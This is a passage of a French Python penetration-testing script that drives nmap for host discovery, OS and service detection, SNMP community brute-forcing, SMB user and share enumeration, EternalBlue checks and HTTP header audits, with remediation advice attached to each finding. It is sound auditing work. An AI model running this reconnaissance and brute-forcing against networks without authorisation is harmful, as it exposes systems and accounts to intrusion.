#!/usr/bin/env python3

# TOOL: NetworkEye - Outil Professionnel de Test d'Intrusion Réseau

import argparse
import socket
import subprocess
import os
import threading
import json
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from tqdm import tqdm
from colorama import Fore, Style, init
import requests
import re
import xml.etree.ElementTree as ET # Pour parser la sortie XML de Nmap
import time # Pour la pause dans l'animation (si utilisée)
import collections # Pour defaultdict

# Initialisation de colorama pour les couleurs de la console
init(autoreset=True) # autoreset=True pour réinitialiser la couleur après chaque print

# --- Variables Globales ---
LOG_FILE = "networkEye.txt" # Nom de fichier de log fixe comme demandé
HTML_REPORT_FILE = "networkEye_report.html" # Nom du fichier de rapport HTML
VERBOSE = False # Contrôle le niveau de verbosité des logs
LOCK = threading.Lock() # Verrou pour la gestion concurrente des logs
RESULTS = [] # Liste pour stocker les résultats des audits

# Animation spinner pour les tâches longues sans barre de progression
SPINNER_CHARS = ['|', '/', '-', '\\']
SPINNER_INDEX = 0
SPINNER_ACTIVE = False
SPINNER_THREAD = None

def start_spinner(message):
    global SPINNER_ACTIVE, SPINNER_THREAD, SPINNER_INDEX
    SPINNER_ACTIVE = True
    SPINNER_INDEX = 0
    tqdm.write(f"{Fore.CYAN}{message}...{Style.RESET_ALL}", end='') # Print message without newline
    sys.stdout.flush()

    def _spinner():
        global SPINNER_INDEX
        while SPINNER_ACTIVE:
            tqdm.write(f"\r{Fore.CYAN}{message}... {SPINNER_CHARS[SPINNER_INDEX % len(SPINNER_CHARS)]}{Style.RESET_ALL}", end='')
            sys.stdout.flush()
            SPINNER_INDEX += 1
            time.sleep(0.1)
        tqdm.write(f"\r{Fore.CYAN}{message}... Terminé.{Style.RESET_ALL}") # Clear spinner line

    SPINNER_THREAD = threading.Thread(target=_spinner)
    SPINNER_THREAD.daemon = True # Daemon thread will exit when main program exits
    SPINNER_THREAD.start()

def stop_spinner():
    global SPINNER_ACTIVE, SPINNER_THREAD
    if SPINNER_ACTIVE:
        SPINNER_ACTIVE = False
        if SPINNER_THREAD and SPINNER_THREAD.is_alive():
            SPINNER_THREAD.join(timeout=0.2) # Give a small moment for the thread to clean up
        tqdm.write("") # Ensure a newline after the spinner stops
        sys.stdout.flush()

# === GESTION DES LOGS ===
def log(msg, level="INFO"):
    """
    Écrit un message dans la console et dans le fichier de log.
    Les messages DEBUG sont affichés uniquement si VERBOSE est True.
    """
    # Modification des couleurs des symboles de log
    symbol = {"INFO": f"{Fore.GREEN}[+]{Style.RESET_ALL}",
              "WARN": f"{Fore.RED}[!]{Style.RESET_ALL}", # WARN en rouge
              "ERR": f"{Fore.RED}[-]{Style.RESET_ALL}",
              "DEBUG": f"{Fore.CYAN}[*]{Style.RESET_ALL}"}.get(level, "[*]")
    
    if SPINNER_ACTIVE:
        pass 

    formatted = f"{symbol} {msg}"
    if level != "DEBUG" or VERBOSE:
        tqdm.write(formatted)

    with LOCK:
        with open(LOG_FILE, "a", encoding="utf-8") as f: 
            f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} {formatted}\n")
    return formatted

# === SCAN DES HÔTES AMÉLIORÉ AVEC FALLBACK ICMP ===
def arp_ping_sweep(network):
    """
    Découvre les hôtes actifs sur un réseau donné.
    Tente un scan ARP (via nmap -sn) en premier.
    Si aucun hôte n'est trouvé ou en cas d'échec, tente un ping sweep ICMP (nmap -PE).
    Extrait les adresses IP, les noms d'hôte et les adresses MAC.
    """
    hosts_info = []
    
    log(f"{Fore.MAGENTA}--- DÉCOUVERTE DES HÔTES ---{Style.RESET_ALL}", "INFO")
    
    # Tentative de scan ARP
    start_spinner("Découverte des hôtes actifs via ARP (nmap -sn)")
    try:
        # Capture stderr pour éviter les tracebacks Nmap bruts
        output = subprocess.check_output(["nmap", "-sn", "--host-timeout", "5s", network], stderr=subprocess.PIPE).decode()
        hosts_info = _parse_nmap_output(output)
        stop_spinner() 
        if hosts_info:
            log(f"{len(hosts_info)} hôtes actifs détectés via ARP.")
            return hosts_info
        else:
            log("Aucun hôte détecté via ARP ou scan incomplet. Tentative via ICMP...", "WARN")
    except FileNotFoundError:
        stop_spinner()
        log("Erreur : nmap n'est pas installé ou introuvable. Veuillez l'installer.", "ERR")
        return []
    except subprocess.CalledProcessError as e:
        stop_spinner()
        log(f"Erreur lors du scan ARP : {e}. Stderr: {e.stderr.decode().strip()}. Tentative via ICMP...", "WARN")
        return []
    except Exception as e:
        stop_spinner()
        log(f"Erreur lors du scan ARP : {e}. Tentative via ICMP...", "WARN")

    # Fallback vers ICMP ping sweep si ARP échoue ou ne trouve rien
    start_spinner("Découverte des hôtes actifs via ICMP (nmap -PE)")
    try:
        output = subprocess.check_output(["nmap", "-PE", "--host-timeout", "5s", network], stderr=subprocess.PIPE).decode()
        hosts_info = _parse_nmap_output(output)
        stop_spinner()
        if hosts_info:
            log(f"{len(hosts_info)} hôtes actifs détectés via ICMP.")
            return hosts_info
        else:
            log("Aucun hôte détecté via ICMP non plus.", "WARN")
    except FileNotFoundError:
        stop_spinner()
        log("Erreur : nmap n'est pas installé ou introuvable. Veuillez l'installer.", "ERR")
        return []
    except subprocess.CalledProcessError as e:
        stop_spinner()
        log(f"Erreur lors du scan ICMP : {e}. Stderr: {e.stderr.decode().strip()}", "ERR")
        return []
    except Exception as e:
        stop_spinner()
        log(f"Erreur lors du scan ICMP : {e}", "ERR")
    
    return []

def _parse_nmap_output(output):
    """Analyse la sortie de nmap pour extraire les informations sur les hôtes."""
    hosts_info = []
    current_ip = None
    ip_host_pattern = re.compile(r"Nmap scan report for (?:(.*?) \()?([\d.]+)\)?")
    mac_pattern = re.compile(r"MAC Address: ([\w:]+)")

    for line in output.splitlines():
        ip_match = ip_host_pattern.search(line)
        if ip_match:
            hostname = ip_match.group(1) if ip_match.group(1) else "N/A"
            ip = ip_match.group(2)
            hosts_info.append({"ip": ip, "hostname": hostname, "mac": "N/A"})
            current_ip = ip
        else:
            mac_match = mac_pattern.search(line)
            if mac_match and current_ip:
                mac = mac_match.group(1)
                for host in hosts_info:
                    if host["ip"] == current_ip:
                        host["mac"] = mac
                        break
                current_ip = None
    return hosts_info

# === EXÉCUTION ET PARSING DES SCRIPTS NMAP (NSE) ===
def run_nmap_script(ip, script_name, port=None, args=""):
    """
    Exécute un script Nmap Scripting Engine (NSE) et parse sa sortie XML.
    """
    cmd = ["nmap", "-Pn", "--script", script_name]
    if args:
        cmd.extend(["--script-args", args])
    if port:
        cmd.extend(["-p", str(port)])
    cmd.extend(["-oX", "-", ip]) # -oX - pour sortie XML sur stdout

    log(f"Exécution du script Nmap : {' '.join(cmd)}", "DEBUG")
    try:
        # Capture stderr pour éviter les tracebacks Nmap bruts
        process = subprocess.run(cmd, capture_output=True, text=True, timeout=60) 
        if process.returncode == 0:
            return process.stdout
        else:
            log(f"Erreur lors de l'exécution du script Nmap {script_name} sur {ip}:{port if port else 'all'}. stderr: {process.stderr.strip()}", "WARN")
            return None
    except subprocess.TimeoutExpired:
        log(f"Timeout lors de l'exécution du script Nmap {script_name} sur {ip}:{port if port else 'all'}.", "WARN")
        return None
    except FileNotFoundError:
        log("Erreur : nmap n'est pas installé ou introuvable. Impossible d'exécuter les scripts Nmap.", "ERR")
        return None
    except Exception as e:
        log(f"Erreur inattendue lors de l'exécution du script Nmap {script_name} sur {ip}:{port if port else 'all'}: {e}", "ERR")
        return None

def parse_nmap_xml_output(xml_output):
    """
    Parse la sortie XML de Nmap et extrait les informations des scripts.
    """
    results = []
    if not xml_output:
        return results
    try:
        root = ET.fromstring(xml_output)
        for host in root.findall('host'):
            ip = host.find('address').get('addr')
            # Extract OS information
            os_match = host.find('os/osmatch')
            os_name = os_match.get('name') if os_match is not None else "N/A"
            os_family = os_match.get('osfamily') if os_match is not None else "N/A"
            os_gen = os_match.get('osgen') if os_match is not None else "N/A"

            # Check for specific OS class
            os_class = host.find('os/osclass')
            if os_class is not None:
                os_name = os_class.get('osfamily') # Prefer osfamily if class is present
                os_vendor = os_class.get('vendor')
                os_accuracy = os_class.get('accuracy')
            
            # Combine OS info
            os_details = {
                "os_name": os_name,
                "os_family": os_family,
                "os_generation": os_gen,
                "vendor": os_vendor if 'os_vendor' in locals() else "N/A",
                "accuracy": os_accuracy if 'os_accuracy' in locals() else "N/A"
            }

            for port_elem in host.findall('ports/port'):
                port_id = port_elem.get('portid')
                # Service info from port scan
                service_elem = port_elem.find('service')
                service_name = service_elem.get('name') if service_elem is not None else "unknown"
                service_product = service_elem.get('product') if service_elem is not None else ""
                service_version = service_elem.get('version') if service_elem is not None else ""

                for script_elem in port_elem.findall('script'):
                    script_id = script_elem.get('id')
                    script_output = script_elem.get('output')
                    results.append({
                        "ip": ip,
                        "os_details": os_details, # Add OS details here
                        "port": port_id,
                        "service_info": {
                            "name": service_name,
                            "product": service_product,
                            "version": service_version
                        },
                        "script_id": script_id,
                        "output": script_output.strip() if script_output else ""
                    })
        return results
    except ET.ParseError as e:
        log(f"Erreur lors du parsing de la sortie XML de Nmap : {e}", "ERR")
        return []
    except Exception as e:
        log(f"Erreur inattendue lors du parsing de la sortie XML de Nmap : {e}", "ERR")
        return []

# === SCAN DE PORTS COMPLET ET DÉTECTION DE VERSION ET OS ===
def perform_port_service_os_scan(ip, ports_to_scan):
    """
    Effectue un scan de ports complet avec détection de services, de versions et d'OS.
    Retourne une liste de ports ouverts avec leurs services et versions, ainsi que l'OS détecté.
    """
    log(f"Scan de ports, détection de services et OS sur {ip}...", "INFO")
    
    cmd = ["nmap", "-Pn", "-sV", "-O"] # -O: OS detection
    if ports_to_scan:
        cmd.extend(["-p", ",".join(map(str, ports_to_scan))])
    else:
        cmd.append("-sC") 
    
    cmd.extend(["-oX", "-", ip])

    try:
        start_spinner(f"Scan de ports et OS sur {ip}")
        process = subprocess.run(cmd, capture_output=True, text=True, timeout=300) 
        stop_spinner()
        if process.returncode == 0:
            open_ports_info = []
            os_details = {"os_name": "N/A", "os_family": "N/A", "os_generation": "N/A", "vendor": "N/A", "accuracy": "N/A"}
            
            root = ET.fromstring(process.stdout)
            for host in root.findall('host'):
                # Extract OS details
                os_match = host.find('os/osmatch')
                if os_match is not None:
                    os_details["os_name"] = os_match.get('name', "N/A")
                    os_details["os_family"] = os_match.get('osfamily', "N/A")
                    os_details["os_generation"] = os_match.get('osgen', "N/A")
                os_class = host.find('os/osclass')
                if os_class is not None:
                    os_details["vendor"] = os_class.get('vendor', "N/A")
                    os_details["accuracy"] = os_class.get('accuracy', "N/A")

                for port_elem in host.findall('ports/port'):
                    state = port_elem.find('state').get('state')
                    if state == 'open':
                        port_id = port_elem.get('portid')
                        service_elem = port_elem.find('service')
                        service_name = service_elem.get('name') if service_elem is not None else "unknown"
                        service_product = service_elem.get('product') if service_elem is not None and service_elem.get('product') else ""
                        service_version = service_elem.get('version') if service_elem is not None and service_elem.get('version') else ""
                        open_ports_info.append({
                            "port": int(port_id),
                            "service": service_name,
                            "product": service_product,
                            "version": service_version
                        })
            log(f"Scan de ports et OS sur {ip} terminé. {len(open_ports_info)} ports ouverts. OS: {os_details['os_name']}", "INFO")
            return {"open_ports": open_ports_info, "os_details": os_details}
        else:
            log(f"Erreur lors du scan de ports/OS sur {ip}. stderr: {process.stderr.strip()}", "ERR")
            return {"open_ports": [], "os_details": {"os_name": "N/A", "os_family": "N/A", "os_generation": "N/A", "vendor": "N/A", "accuracy": "N/A"}}
    except subprocess.TimeoutExpired:
        stop_spinner()
        log(f"Timeout lors du scan de ports/OS sur {ip}.", "ERR")
        return {"open_ports": [], "os_details": {"os_name": "N/A", "os_family": "N/A", "os_generation": "N/A", "vendor": "N/A", "accuracy": "N/A"}}
    except FileNotFoundError:
        stop_spinner()
        log("Erreur : nmap n'est pas installé ou introuvable. Impossible d'effectuer le scan de ports/OS.", "ERR")
        return {"open_ports": [], "os_details": {"os_name": "N/A", "os_family": "N/A", "os_generation": "N/A", "vendor": "N/A", "accuracy": "N/A"}}
    except ET.ParseError as e:
        stop_spinner()
        log(f"Erreur lors du parsing de la sortie XML du scan de ports/OS Nmap sur {ip} : {e}", "ERR")
        return {"open_ports": [], "os_details": {"os_name": "N/A", "os_family": "N/A", "os_generation": "N/A", "vendor": "N/A", "accuracy": "N/A"}}
    except Exception as e:
        stop_spinner()
        log(f"Erreur inattendue lors du scan de ports/OS sur {ip}: {e}", "ERR")
        return {"open_ports": [], "os_details": {"os_name": "N/A", "os_family": "N/A", "os_generation": "N/A", "vendor": "N/A", "accuracy": "N/A"}}

# === Dictionnaire des niveaux de gravité ===
SEVERITY_LEVELS = {
    "Critical": {"console": Fore.RED + Style.BRIGHT + "CRITICAL" + Style.RESET_ALL, "html": "critique"},
    "High": {"console": Fore.RED + "HIGH" + Style.RESET_ALL, "html": "elevée"},
    "Medium": {"console": Fore.YELLOW + "MEDIUM" + Style.RESET_ALL, "html": "moyenne"},
    "Low": {"console": Fore.CYAN + "LOW" + Style.RESET_ALL, "html": "faible"},
    "Informational": {"console": Fore.YELLOW + "INFO" + Style.RESET_ALL, "html": "informationnelle"} # INFO en jaune
}

# === Fonction pour obtenir les recommandations et le score de risque ===
def get_recommendation_and_score(finding_id, service_product="", service_version=""):
    """
    Retourne des recommandations de sécurité, la gravité et un score numérique
    basés sur l'ID de la vulnérabilité/détection.
    Le score est une simplification du CVSS (0-10).
    """
    # Mappage des CVEs ou des problèmes génériques à leurs informations (reco, gravité, score)
    recommendations_data = {
        "CVE-2017-0143": ("Appliquer immédiatement le patch de sécurité MS17-010 de Microsoft (KB4013389). Isoler les systèmes non patchés et restreindre l'accès au port SMB (445) depuis l'extérieur du réseau.", "Critical", 9.8),
        "WEAK_SNMP_COMMUNITY": ("Changer les chaînes de communauté SNMP par défaut (ex: public, private) par des valeurs robustes et uniques. Restreindre l'accès SNMP aux adresses IP autorisées et envisager d'utiliser SNMPv3 pour l'authentification et le chiffrement fort.", "High", 8.0),
        "SNMP_INFO_DISCLOSURE": ("Examiner les informations divulguées via SNMP pour déterminer si elles sont sensibles. Restreindre l'accès SNMP et utiliser SNMPv3 pour un chiffrement fort.", "Medium", 4.0),
        "SMB_ENUM_SHARES": ("Revoir les permissions des partages SMB. S'assurer que le partage anonyme est désactivé et que seuls les utilisateurs autorisés ont accès aux ressources nécessaires. Appliquer le principe du moindre privilège pour les accès.", "High", 7.5),
        "SMB_ENUM_USERS": ("Désactiver l'énumération des comptes. Cela peut être fait via les stratégies de groupe sur les systèmes Windows pour empêcher la divulgation des noms d'utilisateur (par exemple, 'Network access: Do not allow enumeration of SAM accounts and shares').", "High", 7.0),
        "HTTP_MISSING_SECURITY_HEADERS": ("Implémenter les en-têtes de sécurité HTTP tels que Strict-Transport-Security (HSTS), Content-Security-Policy (CSP), X-Content-Type-Options, X-Frame-Options, X-XSS-Protection et Referrer-Policy pour renforcer la protection contre les attaques web courantes.", "Medium", 5.0),
        "HTTP_DIRECTORY_LISTING": ("Désactiver le listage de répertoires sur les serveurs web (par exemple, dans la configuration Apache ou Nginx) pour empêcher la divulgation d'informations sensibles sur la structure des fichiers et les contenus des répertoires.", "High", 7.0),
        "HTTP_DANGEROUS_METHODS": ("Désactiver les méthodes HTTP (comme PUT, DELETE, TRACE) si elles ne sont pas strictement nécessaires pour l'application. Configurer le serveur web pour n'autoriser que les méthodes requises (GET, POST).", "High", 7.0),
        "HTTP_SENSIBLE_PATHS": ("Examiner attentivement les chemins sensibles découverts. Supprimez les fichiers de configuration de débogage ou les pages d'administration exposées publiquement. Mettre en œuvre un contrôle d'accès approprié.", "High", 7.0),
        "CMS_DETECTED_INFO": ("Maintenir le CMS (Content Management System) et tous ses plugins/thèmes à jour avec les dernières versions. Examiner attentivement les configurations par défaut et les durcir. Suivre les bulletins de sécurité spécifiques au CMS utilisé.", "Medium", 6.0),
        "PRINTER_WEAK_CREDENTIALS": ("Restreindre l'accès aux interfaces d'administration des imprimantes. Modifier les mots de passe par défaut. Désactiver les services d'impression non utilisés. Mettre à jour le firmware de l'imprimante pour patcher les vulnérabilités connues.", "High", 8.0),
        "PRINTER_INFO_DISCLOSURE": ("Examiner les informations d'imprimante détectées. Restreindre l'accès et s'assurer qu'aucune information sensible n'est divulguée. Mettre à jour le firmware.", "Medium", 5.0),
        "DOS_SLOWLORIS_VULNERABLE": ("S'assurer que le serveur web est protégé contre les attaques de type Slowloris en configurant des timeouts courts, en limitant la taille des en-têtes ou en utilisant des modules de sécurité (mod_reqtimeout pour Apache, etc.). Un pare-feu applicatif web (WAF) est également recommandé.", "High", 7.5),
        "DOS_NTP_AMPLIFICATION": ("Désactiver le mode 'monlist' sur les serveurs NTP publics si non nécessaire, ou restreindre l'accès à ce service aux adresses IP autorisées pour prévenir les attaques par amplification NTP. Mettre à jour les serveurs NTP vers des versions récentes.", "High", 8.5),
        "DOS_SSDP_AMPLIFICATION": ("Désactiver les services SSDP (Simple Service Discovery Protocol) sur les interfaces publiques des appareils. Mettre en œuvre le filtrage du trafic UDP (port 1900) pour prévenir les attaques par amplification SSDP.", "High", 8.5),
        "NIKTO_VULNERABILITY": ("Une vulnérabilité ou une mauvaise configuration a été détectée par Nikto. Référez-vous à la sortie complète de Nikto pour les détails spécifiques. Appliquez les mises à jour logicielles, supprimez les fichiers inutiles et corrigez les configurations.", "Medium", 6.5),
        "SSH_WEAK_HOSTKEY": ("Générer de nouvelles clés d'hôte SSH avec des algorithmes robustes (ex: Ed25519) et une taille de clé suffisante (RSA >= 2048 bits). Supprimer les anciennes clés faibles.", "High", 7.0),
        "SSH_PASSWORD_AUTH_ENABLED": ("Privilégier l'authentification par clés SSH (public/privée) plutôt que par mot de passe. Désactiver l'authentification par mot de passe dans sshd_config une fois les clés configurées pour une sécurité accrue.", "Medium", 6.0),
        "SSH_ROOT_LOGIN_ENABLED": ("Désactiver la connexion directe de l'utilisateur 'root' via SSH dans le fichier sshd_config. Forcez l'utilisation d'un utilisateur non-privilégié puis utilisez 'sudo' pour les opérations administratives.", "High", 7.5),
        "SSH_ENUM_USERS": (" Examiner les résultats d'énumération des utilisateurs SSH pour identifier les comptes potentiellement valides. Mettre en œuvre des mesures de verrouillage de compte ou de détection d'intrusion pour les tentatives de bruteforce. ", "Medium", 5.0),
        "FTP_ANONYMOUS_LOGIN": ("Désactiver l'accès FTP anonyme si non requis. Si nécessaire, s'assurer que le répertoire anonyme n'est pas inscriptible et ne contient pas d'informations sensibles.", "High", 8.0),
        "FTP_WRITABLE_DIRECTORIES": ("S'assurer qu'aucun répertoire accessible via FTP n'est inscriptible par des utilisateurs non autorisés ou anonymes. Configurer les permissions de fichier et de répertoire de manière restrictive.", "Critical", 9.0),
        "FTP_INFO_DISCLOSURE": ("Examiner les informations FTP énumérées. Configurer le serveur FTP pour minimiser la divulgation d'informations (ex: versions logicielles, chemins de répertoires).", "Low", 3.0),
        "HTTP_ERROR_CODE": ("Examiner la raison du code d'erreur HTTP. Cela peut révéler des informations de débogage ou des chemins non intentionnels. Assurez-vous que les pages d'erreur ne divulguent pas de détails sensibles.", "Informational", 2.0),
        "HTTP_REQUEST_ERROR": ("Indique un problème lors de la tentative de connexion ou de requête HTTP. Vérifiez la connectivité réseau ou l'accessibilité du service HTTP. Ce n'est pas une vulnérabilité directe du serveur.", "Informational", 1.0),
        "HTTP_UNEXPECTED_ERROR": ("Indique une erreur interne du scanner HTTP. Cela ne signifie pas nécessairement une vulnérabilité sur la cible, mais doit être investigué si les audits suivants sont également affectés.", "Informational", 1.0),
        "SQLI_POTENTIAL_PARAM": ("Une injection SQL potentielle a été détectée. Validez et nettoyez toutes les entrées utilisateur côté serveur. Utilisez des requêtes préparées (Prepared Statements) ou des ORMs pour toutes les interactions avec la base de données afin d'éviter les injections SQL.", "Critical", 9.5),
        "WEB_CRAWL_SENSITIVE_FILE": ("Un fichier sensible a été découvert via le crawling. Supprimez ou sécurisez ces fichiers pour empêcher l'accès non autorisé et la fuite d'informations.", "High", 8.0),
        "GENERIC_VULNERABILITY": ("Une vulnérabilité générique a été détectée. Veuillez consulter la sortie Nmap détaillée ou les logs pour plus d'informations et les mesures correctives spécifiques. Vérifiez les bases de données CVE pour des patchs et des solutions.", "Medium", 5.0),
        "WEB_SQLI_ATTEMPT": ("Une tentative d'injection SQL a été simulée et a potentiellement provoqué une réponse différente. Vérifiez la validation des entrées utilisateur. Utilisez des requêtes préparées.", "High", 8.5),
        "WEB_LFI_ATTEMPT": ("Une tentative d'inclusion de fichier local ou de parcours de répertoire a été simulée. Vérifiez que l'application ne permet pas l'accès non autorisé aux fichiers système via des paramètres d'URL.", "Critical", 9.0),
        "WEAK_CREDENTIALS_FOUND": ("Des identifiants faibles ou par défaut ont été trouvés pour ce service. Changez immédiatement les mots de passe. Appliquez des politiques de mots de passe robustes et envisagez l'authentification multi-facteurs.", "Critical", 9.5)
    }

    # Simulate CVE lookup for specific versions (example for Apache)
    if service_product and service_version:
        if "apache" in service_product.lower() and service_version.startswith("2.2"):
            return ("Une vulnérabilité potentielle a été détectée dans Apache 2.2.x (fin de vie, EOL). Mettez à niveau Apache vers la dernière version stable (ex: 2.4.x) et appliquez tous les patchs de sécurité.", "Critical", 9.0)
        # Add more specific version-based CVE mappings here
        # elif "openssh" in service_product.lower() and service_version.startswith("7.2"):
        #    return ("OpenSSH version 7.2 est potentiellement vulnérable à CVE-2016-XXX. Mettez à jour OpenSSH vers une version plus récente et patchée.", "High", 8.0)


    rec, severity, score = recommendations_data.get(finding_id, ("Aucune recommandation spécifique disponible pour cette vulnérabilité. Veuillez investiguer manuellement en recherchant l'ID de la détection et le service concerné.", "Informational", 1.0))
    return rec, severity, score


# === AUDIT SNMP APPROFONDI (avec NSE) ===
def audit_snmp_enhanced(ip, port, os_details={}):
    """
    Effectue un audit SNMP approfondi en utilisant les scripts NSE de Nmap.
    """
    result = {"type": "snmp", "ip": ip, "port": port, "status": "safe", "details": "SNMP non audité ou protégé.", "logs": [], "data": {}, "findings": []}
    log(f"Lancement de l'audit SNMP sur {ip}:{port}...", "INFO")

    snmp_scripts = "snmp-brute,snmp-info"
    if "Windows" in os_details.get("os_family", ""):
        snmp_scripts += ",snmp-win32-services,snmp-win32-shares,snmp-win32-users"

    snmp_scripts_output = run_nmap_script(ip, snmp_scripts, port=port)
    parsed_output = parse_nmap_xml_output(snmp_scripts_output)

    vulnerabilities_found = False

    for item in parsed_output:
        result["data"][item['script_id']] = item['output'] # Store all script outputs in data for full context
        
        if item['script_id'] == 'snmp-brute':
            if "valid community strings" in item['output'] or "found" in item['output'].lower():
                rec, severity, score = get_recommendation_and_score("WEAK_SNMP_COMMUNITY")
                result["findings"].append({
                    "id": "WEAK_SNMP_COMMUNITY",
                    "description": f"Chaînes de communauté SNMP faibles détectées sur le port {port}: {item['output']}",
                    "ip": ip,
                    "port": port,
                    "recommendation": rec,
                    "severity": severity,
                    "score": score
                })
                vulnerabilities_found = True
        elif item['script_id'] == 'snmp-win32-shares' and item['output'].strip():
            rec, severity, score = get_recommendation_and_score("SMB_ENUM_SHARES")
            result["findings"].append({
                "id": "SMB_ENUM_SHARES", # Réutilise un ID SMB car il s'agit d'énumération de partages Windows via SNMP
                "description": f"Partages Windows énumérés via SNMP sur le port {port}: {item['output']}",
                    "ip": ip,
                    "port": port,
                    "recommendation": rec,
                    "severity": severity,
                    "score": score
                })
            vulnerabilities_found = True
        elif item['script_id'] == 'snmp-win32-users' and item['output'].strip():
            rec, severity, score = get_recommendation_and_score("SMB_ENUM_USERS")
            result["findings"].append({
                "id": "SMB_ENUM_USERS", # Réutilise un ID SMB pour l'énumération d'utilisateurs Windows via SNMP
                "description": f"Utilisateurs Windows énumérés via SNMP sur le port {port}: {item['output']}",
                    "ip": ip,
                    "port": port,
                    "recommendation": rec,
                    "severity": severity,
                    "score": score
                })
            vulnerabilities_found = True
        elif item['script_id'] == 'snmp-info' and item['output'].strip():
            rec, severity, score = get_recommendation_and_score("SNMP_INFO_DISCLOSURE")
            result["findings"].append({
                "id": "SNMP_INFO_DISCLOSURE",
                "description": f"Informations système via SNMP sur le port {port}: {item['output']}",
                    "ip": ip,
                    "port": port,
                    "recommendation": rec,
                    "severity": severity,
                    "score": score
                })


    if vulnerabilities_found:
        result["status"] = "vulnerable"
        result["details"] = "Vulnérabilités SNMP ou fuites d'informations détectées."
        log(f"SNMP sur {ip}:{port} - Vulnérabilités détectées.", "WARN")
    elif result["findings"]: # Si seulement des informations ont été divulguées mais pas des vulnérabilités directes
        result["status"] = "info_disclosure"
        result["details"] = "Informations sensibles SNMP détectées."
        log(f"SNMP sur {ip}:{port} - Informations sensibles détectées.", "INFO")
    else:
        result["details"] = "Aucune vulnérabilité SNMP flagrante ou information sensible détectée."
        log(f"SNMP sur {ip}:{port} : {result['details']}", "INFO")
    
    return result

# === AUDIT SMB APPROFONDI (avec NSE) ===
def audit_smb_enhanced(ip, port, os_details={}):
    """
    Effectue un audit SMB approfondi en utilisant les scripts NSE de Nmap.
    """
    result = {"type": "smb", "ip": ip, "port": port, "status": "safe", "details": "SMB non audité ou protégé.", "logs": [], "data": {}, "findings": []}
    log(f"Lancement de l'audit SMB sur {ip}:{port}...", "INFO")

    smb_scripts = "smb-enum-shares,smb-os-discovery,smb-security-mode,smb-vuln-ms08-067,smb-vuln-ms17-010,smb-enum-users"
    smb_scripts_output = run_nmap_script(ip, smb_scripts, port=port)
    parsed_output = parse_nmap_xml_output(smb_scripts_output)

    vulnerabilities_found = False

    for item in parsed_output:
        result["data"][item['script_id']] = item['output'] # Store all script outputs
        
        if item['script_id'] == 'smb-enum-shares':
            if "READ" in item['output'] or "WRITE" in item['output'] or "Anonymous access" in item['output']:
                rec, severity, score = get_recommendation_and_score("SMB_ENUM_SHARES")
                result["findings"].append({
                    "id": "SMB_ENUM_SHARES",
                    "description": f"Partages SMB accessibles sur le port {port}: {item['output']}",
                    "ip": ip,
                    "port": port,
                    "recommendation": rec,
                    "severity": severity,
                    "score": score
                })
                vulnerabilities_found = True
        elif item['script_id'] == 'smb-enum-users' and item['output'].strip():
            rec, severity, score = get_recommendation_and_score("SMB_ENUM_USERS")
            result["findings"].append({
                "id": "SMB_ENUM_USERS",
                "description": f"Utilisateurs SMB énumérés sur le port {port}: {item['output']}",
                    "ip": ip,
                    "port": port,
                    "recommendation": rec,
                    "severity": severity,
                    "score": score
                })
            vulnerabilities_found = True
        elif item['script_id'] == 'smb-vuln-ms17-010' and "VULNERABLE" in item['output'].upper():
            rec, severity, score = get_recommendation_and_score("CVE-2017-0143")
            result["findings"].append({
                "id": "CVE-2017-0143",
                "description": f"Vulnérabilité EternalBlue (MS17-010) détectée sur le port {port}: {item['output']}",
                    "ip": ip,
                    "port": port,
                    "recommendation": rec,
                    "severity": severity,
                    "score": score
                })
            vulnerabilities_found = True
        # Ajoutez ici d'autres détections de vulnérabilités SMB si nécessaire

    if vulnerabilities_found:
        result["status"] = "vulnerable"
        result["details"] = "Vulnérabilités SMB ou fuites d'informations détectées."
        log(f"SMB sur {ip}:{port} - Vulnérabilités détectées.", "WARN")
    elif result["findings"]:
        result["status"] = "info_disclosure"
        result["details"] = "Informations sensibles SMB détectées."
        log(f"SMB sur {ip}:{port} - Informations sensibles détectées.", "INFO")
    else:
        result["details"] = "Aucune vulnérabilité SMB flagrante ou information sensible détectée."
        log(f"SMB sur {ip}:{port} : {result['details']}", "INFO")

    return result

# === AUDIT HTTP/HTTPS APPROFONDI (avec NSE et requêtes directes) ===
def audit_http_enhanced(ip, port, os_details={}):
    """
    Effectue un audit HTTP/HTTPS approfondi en utilisant les scripts NSE de Nmap
    et des requêtes directes pour vérifier les en-têtes.
    """
    result = {"type": "http", "ip": ip, "port": port, "status": "safe", "details": "", "logs": [], "data": {}, "findings": []}
    log(f"Lancement de l'audit HTTP/HTTPS sur {ip}:{port}...", "INFO")

    vulnerabilities_found = False
    
    # 1. Requête directe pour les en-têtes et le listage de répertoires
    try:
        proto = "https" if port == 443 else "http"
        url = f"{proto}://{ip}:{port}"
        r = requests.get(url, timeout=10, verify=(proto == "http"), allow_redirects=True) 
        
        headers = dict(r.headers)
        security_headers_to_check = {
            "Strict-Transport-Security": "HSTS", 
            "Content-Security-Policy": "CSP",
            "X-Content-Type-Options": "X-Content-Type-Options", 
            "X-Frame-Options": "X-Frame-Options",
            "X-XSS-Protection": "X-XSS-Protection", 
            "Referrer-Policy": "Referrer-Policy"
        }
        missing_headers = [name for name, _ in security_headers_to_check.items() if name not in headers]
        
        directory_listing_detected = "Index of /" in r.text or "Directory listing for" in r.text

        result["data"].update({
            "url": url,
            "status_code": r.status_code,
            "headers": headers,
            "response_title": re.search(r"<title>(.*?)</title>", r.text, re.IGNORECASE | re.DOTALL).group(1) if re.search(r"<title>(.*?)</title>", r.text, re.IGNORECASE | re.DOTALL) else "N/A"
        })

        if missing_headers:
            rec, severity, score = get_recommendation_and_score("HTTP_MISSING_SECURITY_HEADERS")
            result["findings"].append({
                "id": "HTTP_MISSING_SECURITY_HEADERS",
                "description": f"En-têtes de sécurité HTTP manquants sur {url} : {', '.join(missing_headers)}",
                "ip": ip,
                "port": port,
                "recommendation": rec,
                "severity": severity,
                "score": score
            })
            vulnerabilities_found = True
        if directory_listing_detected:
            rec, severity, score = get_recommendation_and_score("HTTP_DIRECTORY_LISTING")
            result["findings"].append({
                "id": "HTTP_DIRECTORY_LISTING",
                "description": f"Listage de répertoires activé sur {url}.",
                "ip": ip,
                "port": port,
                "recommendation": rec,
                "severity": severity,
                "score": score
            })
            vulnerabilities_found = True
        if r.status_code >= 400:
            rec, severity, score = get_recommendation_and_score("HTTP_ERROR_CODE")
            result["findings"].append({
                "id": "HTTP_ERROR_CODE",
                "description": f"Code HTTP de réponse {r.status_code} sur {url} (peut indiquer une mauvaise configuration ou un contenu inattendu).",
